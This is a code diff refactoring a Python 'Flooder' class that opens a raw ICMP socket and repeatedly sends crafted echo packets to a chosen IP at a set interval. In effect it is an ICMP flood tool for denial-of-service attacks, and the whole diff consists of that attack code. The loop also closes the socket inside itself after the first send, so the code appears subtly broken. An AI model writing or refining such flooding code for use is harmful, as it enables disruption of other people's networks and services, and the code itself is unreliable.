@@ -12,9 +12,9 @@ from socket import (
 
 
 class Flooder(object):
-    def __init__(self, ip, port, length, freq, threads):
+    def __init__(self, threads: int):
+        self.threads = threads
         self.running_status = True
-        self.create_socket(ip, port, length, freq)
 
     @staticmethod
     def _checksum(message) -> int:
@@ -31,12 +31,12 @@ class Flooder(object):
         header = pack("bbHHh", 8, 0, htons(self._checksum(header + data)), 1, 1)
         return header + data
 
-    def create_socket(self, ip: str, port: int, length: int, freq: float) -> None:
+    def run_flooding(self, ip: str, port: int, length: int, frequency: float) -> None:
         sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP)
         inet_aton(ip)
 
         while self.running_status:
             packet = self._construct_packet(length)
             sock.sendto(packet, (ip, port))
-            sleep(freq)
+            sleep(frequency)
             sock.close()
